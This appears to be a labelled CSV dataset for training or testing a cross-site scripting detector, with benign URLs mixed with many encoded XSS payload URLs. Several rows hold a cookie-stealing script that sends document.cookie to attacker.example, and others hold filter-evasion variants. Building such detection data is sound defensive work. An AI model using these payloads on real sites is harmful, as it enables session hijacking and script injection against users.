url,payload,carrier,param_name,encoded,notes,label
https://testsite.local/search?url=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F&ref=1,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,url,mixed,eval_obf,1
https://catalog.example/search?name=test,test,query,name,raw,benign,0
https://portal.example.net/search?file=prices&session=organic,prices,query,file,raw,benign,0
https://portal.example.net/search?name=test,test,query,name,raw,benign,0
https://testsite.local/redirect?url=https://victim.example/?p=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,redirect,file,urlencoded,already_encoded,1
https://mysite.example/page#cart14770,cart14770,fragment,,raw,benign,0
https://wEbapP.local/search?callback=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,callback,mixed,eval_obf,1
https://webapp.local/redirect?url=https://victim.example/?p=user98966,user98966,redirect,name,raw,benign,0
https://service.test/search?name=about-new,about-new,query,name,raw,benign,0
https://service.test/search?search=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,search,raw,cookie_exfil,1
https://demo.example.org/search?search=cart&source=1,cart,query,search,raw,benign,0
https://service.test/search?search=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,query,search,urlencoded,already_encoded,1
https://catalog.example/search?file=login90101,login90101,query,file,raw,benign,0
https://shop.example/api?callback=prices&id=1,prices,callback,id,raw,benign,0
https://webapp.local/search?term=news&utm_source=google,news,query,term,raw,benign,0
https://demo.example.org/search?view=profile&lang=google,profile,query,view,raw,benign,0
https://webapp.local/search?url=%253Cscript%253Efetch%2528%2527http%253A%252F%252Fattacker.example%252Fsteal%253Fc%253D%2527%252Bdocument.cookie%2529%253C%252Fscript%253E,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,url,double_urlencoded,cookie_exfil,1
https://portal.example.net/user/%22%3E%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E/profile,"""><video><source onerror=alert(1)></video>",path,,urlencoded,attribute_breakout_video,1
https://webapp.local/user/cart/profile,cart,path,,raw,benign,0
https://service.test/user/order/profile,order,path,,raw,benign,0
https://mysite.example/search?page=index&page=en,index,query,page,raw,benign,0
https://testsite.local/user/user36958/profile,user36958,path,,raw,benign,0
https://testsite.local/search?page=news,news,query,page,raw,benign,0
https://demo.example.org/search?page=signup,signup,query,page,raw,benign,0
https://webapp.local/api?callback=login&id=1&ref=organic,login,callback,input,raw,benign,0
https://catalog.example/search?utm_source=42&utm_source=organic,42,query,utm_source,raw,benign,0
https://example.com/api?callback=%27%29%3Balert%281%29%3B%2F%2F&id=1,');alert(1);//,callback,msg,mixed,inline_js_snippet,1
https://blog.example/search?query=login&ref=en,login,query,query,raw,benign,0
https://service.test/search?q=prices-info&utm_source=affiliate,prices-info,query,q,raw,benign,0
https://vulnerable.app/user/{{constructor.constructor('alert(1)')()}}/profile,{{constructor.constructor('alert(1)')()}},path,,raw,template_injection,1
https://portal.example.net/search?callback=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,query,callback,urlencoded,already_encoded,1
https://shop.example/search?utm_source=prices&source=newsletter,prices,query,utm_source,raw,benign,0
https://example.com/api?callback=signup&id=1,signup,callback,query,raw,benign,0
https://demo.example.org/search?file=signup&session=organic,signup,query,file,raw,benign,0
https://mysite.example/page#news-usr,news-usr,fragment,,raw,benign,0
https://example.com/search?page=home,home,query,page,raw,benign,0
https://webapp.local/api?callback=');document.location='javascript:alert(1)'//&id=1&lang=en,');document.location='javascript:alert(1)'//,callback,callback,raw,document_location_js,1
https://shop.example/search?url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,query,url,urlencoded,script_tag,1
https://testsite.local/page#&lt;body onload=alert(1)&gt;,<body onload=alert(1)>,fragment,,html_entity,body_onload,1
https://shop.example/search?id=news,news,query,id,raw,benign,0
https://portal.example.net/search?q=<iframe src='javascript:alert(1)'></iframe>&utm_source=en,<iframe src='javascript:alert(1)'></iframe>,query,q,raw,iframe_js_uri,1
https://example.com/search?session=prices,prices,query,session,raw,benign,0
https://portal.example.net/search?msg=contact&session=0,contact,query,msg,raw,benign,0
https://portal.example.net/search?msg=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,query,msg,urlencoded,script_tag,1
https://service.test/search?query=en,en,query,query,raw,benign,0
https://demo.example.org/search?query=about&lang=1,about,query,query,raw,benign,0
https://shop.example/search?view=product,product,query,view,raw,benign,0
"https://Portal.exAmPlE.net/user/""><svg onload=alert(1)>/profile","""><svg onload=alert(1)>",path,,raw,attribute_breakout_svg,1
https://blog.example/user/user/profile,user,path,,raw,benign,0
https://service.test/search?callback=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,callback,raw,svg_cdata_script,1
https://service.test/api?callback=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>&id=1,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,callback,s,raw,cookie_exfil,1
https://testsite.local/page#prices,prices,fragment,,raw,benign,0
https://service.test/api?callback=%2527%2529%253Balert%25281%2529%253B%252F%252F&id=1,');alert(1);//,callback,callback,double_urlencoded,inline_js_snippet,1
https://testsite.local/search?query=checkout,checkout,query,query,raw,benign,0
"https://vulnerable.app/user/""><svg onload=alert(1)>/profile","""><svg onload=alert(1)>",path,,raw,attribute_breakout_svg,1
https://shop.example/api?callback=cart-2025&id=1,cart-2025,callback,utm_source,raw,benign,0
https://testsite.local/search?search=');document.location='javascript:alert(1)'//,');document.location='javascript:alert(1)'//,query,search,raw,document_location_js,1
https://testsite.local/user/prices/profile,prices,path,,raw,benign,0
https://service.test/user/page/profile,page,path,,raw,benign,0
"https://service.test/page#&#x27;);eval(String.fromCharCode(97,108,101,114,116,40,49,41))//","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",fragment,,html_entity,eval_obf,1
https://vulnerable.app/api?callback=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>&id=1&ref=newsletter,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,callback,callback,raw,svg_cdata_script,1
https://testsite.local/page#%2527%2529%253Balert%25281%2529%253B%252F%252F,');alert(1);//,fragment,,double_urlencoded,inline_js_snippet,1
https://catalog.example/search?file=1,1,query,file,raw,benign,0
https://testsite.local/search?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,query,search,urlencoded,script_tag,1
https://vulnerable.app/user/%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E/profile,"""><img src=x onerror=alert(1)>",path,,mixed,attribute_breakout_img,1
https://blog.example/search?ref=order66412&ref=newsletter,order66412,query,ref,raw,benign,0
https://demo.example.org/api?callback=javascript:alert(1)&id=1,javascript:alert(1),callback,id,html_entity,js_uri,1
https://service.test/search?q={{constructor.constructor('alert(1)')()}},{{constructor.constructor('alert(1)')()}},query,q,raw,template_injection,1
https://webapp.local/search?msg=details,details,query,msg,raw,benign,0
https://shop.example/search?session=news-usr,news-usr,query,session,raw,benign,0
https://webapp.local/user/%27%29%3Balert%281%29%3B%2F%2F/profile,');alert(1);//,path,,urlencoded,inline_js_snippet,1
https://service.test/redirect?url=https://victim.example/?p=2025-10-01,2025-10-01,redirect,page,raw,benign,0
https://example.com/search?name=%25253Cscript%25253Ealert%25281%2529%25253C%252Fscript%25253E&lang=google,%3Cscript%3Ealert(1)%3C/script%3E,query,name,double_urlencoded,already_encoded,1
https://shop.example/page#&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0;url=javascript:alert(1)&#x27;&gt;,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,fragment,,html_entity,meta_refresh_js_uri,1
https://service.test/search?callback=test&source=newsletter,test,query,callback,raw,benign,0
https://catalog.example/search?input=about,about,query,input,raw,benign,0
https://webapp.local/search?input=category-2025&page=newsletter,category-2025,query,input,raw,benign,0
https://service.test/api?callback=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E&id=1,<iframe src='javascript:alert(1)'></iframe>,callback,callback,urlencoded,iframe_js_uri,1
"https://portal.example.net/search?page=""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",query,page,raw,attribute_breakout_video,1
https://testsite.local/search?q=');alert(1);//,');alert(1);//,query,q,raw,inline_js_snippet,1
https://testsite.local/user/order/profile,order,path,,raw,benign,0
https://shop.example/search?view=%253Cmath%253E%253Cmi%253E%253C%252Fmi%253E%253Cmfrac%253E%253Cmn%253E%253C%252Fmn%253E%253C%252Fmfrac%253E%253C%252Fmath%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&lang=xyz,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,view,double_urlencoded,script_in_math,1
https://shop.example/api?callback=%253Cscript%253Ealert%281%29%253C%2Fscript%253E&id=1&lang=0,%3Cscript%3Ealert(1)%3C/script%3E,callback,callback,urlencoded,already_encoded,1
https://testsite.local/search?query=test-x,test-x,query,query,raw,benign,0
https://demo.example.org/api?callback=prices-x&id=1,prices-x,callback,callback,raw,benign,0
https://example.com/search?view=<body onload=alert(1)>&page=en,<body onload=alert(1)>,query,view,raw,body_onload,1
https://demo.example.org/search?q=prices,prices,query,q,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>&ref=google,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,redirect,q,raw,svg_cdata_script,1
https://example.com/search?url=category-details&ref=affiliate,category-details,query,url,raw,benign,0
https://DEmo.exampLE.oRg/search?term=');alert(1);//,');alert(1);//,query,term,raw,inline_js_snippet,1
https://testsite.local/search?name=index&page=organic,index,query,name,raw,benign,0
https://blog.example/user/42/profile,42,path,,raw,benign,0
https://eXAmple.com/redirect?url=https://victim.example/?p={{constructor.constructor('alert(1)')()}}&page=0,{{constructor.constructor('alert(1)')()}},redirect,term,raw,template_injection,1
https://demo.example.org/search?page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=en,<script>alert(1)</script>,query,page,urlencoded,script_tag,1
https://testsite.local/search?search=user&ref=google,user,query,search,raw,benign,0
https://demo.example.org/user/<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>/profile,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,path,,raw,meta_refresh_js_uri,1
https://mysite.example/search?file=news,news,query,file,raw,benign,0
https://webapp.local/search?s=en,en,query,s,raw,benign,0
https://demo.example.org/search?term=user-new&utm_source=en,user-new,query,term,raw,benign,0
https://testSite.local/api?callback=&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0;url=javascript:alert(1)&#x27;&gt;&id=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,redirect,html_entity,meta_refresh_js_uri,1
https://demo.example.org/search?q=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,q,urlencoded,img_onerror_obf,1
https://example.com/user/1/profile,1,path,,raw,benign,0
https://shop.example/search?ref=about,about,query,ref,raw,benign,0
https://shop.example/search?s=javascript%3Aalert%281%29,javascript:alert(1),query,s,urlencoded,js_uri,1
https://webapp.local/user/index/profile,index,path,,raw,benign,0
https://portal.example.net/search?view=user-details&source=en,user-details,query,view,raw,benign,0
https://webapp.local/api?callback=42&id=1,42,callback,utm_source,raw,benign,0
https://example.com/search?query=signup,signup,query,query,raw,benign,0
"https://portal.example.net/search?msg=""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)>",query,msg,raw,attribute_breakout_img,1
https://catalog.example/search?search=2025-10-01,2025-10-01,query,search,raw,benign,0
https://example.com/redirect?url=https://victim.example/?p=<iframe src='javascript:alert(1)'></iframe>&utm_source=google,<iframe src='javascript:alert(1)'></iframe>,redirect,msg,raw,iframe_js_uri,1
https://vulnerable.app/search?page=%253Ciframe%2520src%253D%2527javascript%253Aalert%25281%2529%2527%253E%253C%252Fiframe%253E,<iframe src='javascript:alert(1)'></iframe>,query,page,double_urlencoded,iframe_js_uri,1
https://webapp.local/api?callback=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>&id=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,callback,raw,meta_refresh_js_uri,1
https://blog.example/search?callback=home&source=1,home,query,callback,raw,benign,0
https://portal.example.net/user/&#x27;);alert(1);///profile,');alert(1);//,path,,html_entity,inline_js_snippet,1
https://service.test/api?callback=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D&id=1,{{constructor.constructor('alert(1)')()}},callback,callback,urlencoded,template_injection,1
https://demo.example.org/search?callback=prices,prices,query,callback,raw,benign,0
https://example.com/api?callback=%3Cbody+onload%3Dalert%281%29%3E&id=1&utm_source=0,<body onload=alert(1)>,callback,callback,mixed,body_onload,1
https://portal.example.net/search?name=2025-10-01-ref&lang=en,2025-10-01-ref,query,name,raw,benign,0
https://example.com/api?callback=news-ref&id=1,news-ref,callback,view,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt;&lt;/iframe&gt;,<iframe src='javascript:alert(1)'></iframe>,redirect,file,html_entity,iframe_js_uri,1
https://testsite.local/search?s=product,product,query,s,raw,benign,0
https://example.com/search?name=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,name,raw,svg_cdata_script,1
https://portal.example.net/page#%2527%2529%253Balert%25281%2529%253B%252F%252F,');alert(1);//,fragment,,double_urlencoded,inline_js_snippet,1
https://mysite.example/user/home/profile,home,path,,raw,benign,0
https://vulnerable.app/redirect?url=https://victim.example/?p=%253Cscript%253Efetch%2528%2527http%253A%252F%252Fattacker.example%252Fsteal%253Fc%253D%2527%252Bdocument.cookie%2529%253C%252Fscript%253E,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,redirect,search,double_urlencoded,cookie_exfil,1
https://vulnerable.app/search?s=%22%3E%3Csvg%20onload%3Dalert%281%29%3E,"""><svg onload=alert(1)>",query,s,urlencoded,attribute_breakout_svg,1
https://mysite.example/page#signup,signup,fragment,,raw,benign,0
https://demo.example.org/api?callback=4252309&id=1,4252309,callback,session,raw,benign,0
https://demo.example.org/search?ref=contact1587,contact1587,query,ref,raw,benign,0
https://example.com/search?page=&lt;math&gt;&lt;mi&gt;&lt;/mi&gt;&lt;mfrac&gt;&lt;mn&gt;&lt;/mn&gt;&lt;/mfrac&gt;&lt;/math&gt;&lt;script&gt;alert(1)&lt;/script&gt;&session=en,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,page,html_entity,script_in_math,1
https://webapp.local/page#%27%29%3Balert%281%29%3B%2F%2F,');alert(1);//,fragment,,urlencoded,inline_js_snippet,1
https://webapp.local/redirect?url=https://victim.example/?p=category&ref=affiliate,category,redirect,term,raw,benign,0
https://mysite.example/page#category,category,fragment,,raw,benign,0
https://testsite.local/search?session=user,user,query,session,raw,benign,0
https://mysite.example/search?page=order,order,query,page,raw,benign,0
https://demo.example.org/search?url=2025-10-01-2025&ref=organic,2025-10-01-2025,query,url,raw,benign,0
